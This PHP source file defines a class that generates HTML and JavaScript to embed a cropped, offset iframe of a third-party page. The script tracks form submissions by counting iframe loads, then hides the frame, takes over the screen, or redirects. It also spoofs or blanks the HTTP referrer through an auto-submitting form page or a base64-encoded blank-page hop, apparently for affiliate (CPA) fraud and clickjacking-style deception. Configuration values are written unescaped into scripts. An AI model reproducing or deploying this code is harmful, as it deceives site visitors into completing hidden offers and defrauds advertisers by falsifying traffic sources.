<?php

class CodeStuffer
{
    private $info = array();
    private $firstPageArea = array();
    private $secondPageArea = array();
    private $blankPage = "";

    private static $pageWidth = 1200;
    private static $pageHeight = 2000;

    function __construct($iframeInfo, $blankPage)
    {
        $this->info = $iframeInfo;
        $this->blankPage = $blankPage;
        $this->parseArea();
    }

    private function parseArea()
    {
        $this->firstPageArea = $this->info["cropArea"][0];
        if(isset($this->info["cropArea"][1]))
            $this->secondPageArea = $this->info["cropArea"][1];
    }

    private function generateIframe($page, $areaInfo)
    {
        $html = sprintf('<iframe id="%s_iframe" src="%s" style="display: block; margin: 0; padding: 0; border: none; width: %spx; height: %spx;'
        . ' position: absolute; z-index: 1; left: -%spx; top: -%spx;" scrolling="no" frameborder="0" onload="%s_onload()"></iframe>',
            $this->info["rand"], $page, self::$pageWidth, self::$pageHeight,
            $areaInfo["x"], $areaInfo["y"], $this->info["rand"]
        );
        return $html;
    }

    private function generateScript()
    {
        if($this->info["referrerType"] == "blank")
        {
            $iframeInitValue = -1;
        }
        else
            $iframeInitValue = 0;
        $iframeInitValue -= $this->info["firstPageRedirectTimes"];
        $script = <<<script
<script type="text/javascript">
    var {$this->info["rand"]}_iframe_history = $iframeInitValue;
    function {$this->info["rand"]}_onload()
    {
        {$this->info["rand"]}_iframe_history++;
        if({$this->info["rand"]}_iframe_history == 2)
        {

script;
    $message = "";
    if($this->info["firstMessage"])
    {
        if(stripos($this->info["firstMessage"], "http") !== 0)
            $message = <<<script
            alert("{$this->info["firstMessage"]}");

script;
        else
            $message = <<<script
            window.open("{$this->info["firstMessage"]}", "message");

script;
    }
    if($this->info["afterFirstSubmit"] == "hide")
    $script .= <<<script
            document.getElementById("{$this->info["rand"]}").style.display = "none";
$message
script;
    else if($this->info["afterFirstSubmit"] == "fullPage")
        $script .= <<<script
            var body = document.getElementsByTagName("body")[0];
            var width = window.innerWidth;
            var height = window.innerHeight;
            var elements = body.getElementsByTagName("*");
            for(var i = 0; i < elements.length; i++)
            {
                elements[i].style.position = "static";
                elements[i].style.zIndex = 0;
                elements[i].style.width = "auto";
                elements[i].style.height = "auto";
                elements[i].style.overflow = "";
            }
            document.documentElement.style.overflow = "hidden";
            document.documentElement.style.margin = "0px";
            document.documentElement.style.padding = "0px";
            document.documentElement.style.border = "none";
            document.body.style.overflow = "hidden";
            body.style.overflow = "hidden";
            body.style.margin = "0px";
            body.style.padding = "0px";
            body.style.border = "none";
            var iframe = document.getElementById("{$this->info["rand"]}_iframe");
            iframe.style.position = "absolute";
            iframe.style.zIndex = "100";
            iframe.style.left = "0px";
            iframe.style.top = "0px";
            iframe.style.width = width + "px";
            iframe.style.height = height + "px";
            iframe.scrolling = "auto";
            
            var oldResize = window.onresize;
            window.onresize = function()
            {
                if(oldResize)
                    oldResize();
                var width = window.innerWidth;
                var height = window.innerHeight;
                var iframe = document.getElementById("{$this->info["rand"]}_iframe");
                iframe.style.width = width + "px";
                iframe.style.height = height + "px";
            }
$message
script;
    else if($this->info["afterFirstSubmit"] == "redirect")
        $script .= <<<script
            document.getElementById("{$this->info["rand"]}").style.display = "none";
$message
            window.location = "{$this->info["redirectPage"]}";
script;
    else
    {
        $iframeWidth = $this->secondPageArea["width"];
        $iframeHeight = $this->secondPageArea["height"];
        $script .= <<<script
            var cpa = document.getElementById("{$this->info["rand"]}");
            var cpa_iframe = document.getElementById("{$this->info["rand"]}_iframe");
            cpa.style.width = "{$this->secondPageArea["width"]}px";
            cpa.style.height = "{$this->secondPageArea["height"]}px";
            cpa_iframe.style.left = "-{$this->secondPageArea["x"]}px";
            cpa_iframe.style.top = "-{$this->secondPageArea["y"]}px";
$message
script;
        if($this->info["secondPage"] && $this->info["secondPage"] != $this->info["firstPage"])
        {
            $page = $this->info["secondPage"];
            if($this->info["referrerType"] == "blank")
                $page = $this->blankPage . "?" . base64_encode($page);
            $script .= <<<script
            cpa_iframe.src = "{$page}";

script;
        }
    }
    $script .= <<<script

        }

script;
    if($this->info["afterFirstSubmit"] == "default")
    {
        $secondFlag = 3;
        if($this->info["secondPage"] && $this->info["secondPage"] != $this->info["firstPage"])
        {
            $secondFlag = 4;
            if($this->info["referrerType"] == "blank")
                $secondFlag = 5;
        }

        $script .= <<<script
        if({$this->info["rand"]}_iframe_history == {$secondFlag})
        {
            document.getElementById("{$this->info["rand"]}").style.display = "none";

script;
        if($this->info["secondMessage"])
        {
            if(stripos($this->info["secondMessage"], "http") !== 0)
                $script .= <<<script
            alert("{$this->info["secondMessage"]}");

script;
            else
                $script .= <<<script
            window.open("{$this->info["secondMessage"]}", "message");

script;
        }
        if($this->info["redirectPage"])
            $script .= <<<script
            window.location = "{$this->info["redirectPage"]}";

script;
        $script .= <<<script
        }

script;
    }
    $script .= <<<script
    }
</script>
script;
    return $script;
    }

    public function stuffCode()
    {
        $page = $this->info["firstPage"];
        if($this->info["referrerType"] != "default")
        {
            if($this->info["referrerType"] == "fake")
            {
                $page = $this->info["referrer"];
                if(strpos($page, "?") !== false)
                {
                    $page .= "&";
                }
                else
                {
                    $page .= "?";
                }
                $page .= $this->info["rand"];
            }
            else
            {
                $page = $this->blankPage . "?" . base64_encode($this->info["firstPage"]);
            }
        }
        $code = sprintf('<div id="%s" style="margin: 0; padding: 0; border: none;'
            . ' width: %spx; height: %spx; overflow: hidden; position: relative; z-index: 0;">
%s
</div>
%s
            ', $this->info["rand"], $this->firstPageArea["width"], $this->firstPageArea["height"],
            $this->generateIframe($page, $this->firstPageArea), $this->generateScript()
        );
        return $code;
    }

    public function stuffReferrerCode()
    {
        $phpCode = '<?php
if(isset($_GET["' . $this->info["rand"] . '"]))
{
    echo <<<code
<form id="' . $this->info["rand"] . '_form" method="post" action="' . $this->info["referrer"] . '">
    <input type="hidden" name="' . $this->info["rand"] . '" value="true" />
</form>
<script type="text/javascript">
    var ' . $this->info["rand"] . '_form = document.getElementById("' . $this->info["rand"] . '_form");
    ' . $this->info["rand"] . '_form.submit();
</script>
code;
}
if(isset($_POST["' . $this->info["rand"] . '"]))
{
    echo <<<code
<script type="text/javascript">
    window.location = "' . $this->info["firstPage"] . '";
</script>
code;
}
?>';
        return $phpCode;
    }

}
